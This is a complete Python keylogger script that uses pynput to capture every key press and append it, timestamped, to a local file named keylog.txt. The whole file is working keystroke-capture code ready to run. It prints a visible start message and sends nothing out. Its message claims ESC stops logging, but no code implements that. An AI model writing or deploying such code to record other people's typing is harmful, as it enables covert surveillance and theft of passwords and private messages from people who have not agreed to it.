from pynput.keyboard import Listener
import logging
from datetime import datetime

def configure_logging():
    """Configure logging settings for the keylogger"""
    log_file = "keylog.txt"
    logging.basicConfig(
        filename=log_file,
        level=logging.DEBUG,
        format='%(asctime)s: %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

def on_press(key):
    """Callback function for key press events"""
    try:
        logging.info(f"Key pressed: {key}")
    except Exception as e:
        print(f"Error logging key press: {e}")

def start_keylogger():
    """Start the keylogger listener"""
    print(f"Keylogger started. Logging to keylog.txt. Press ESC to stop.")
    
    with Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger stopped by user")

if __name__ == "__main__":
    configure_logging()
    start_keylogger()
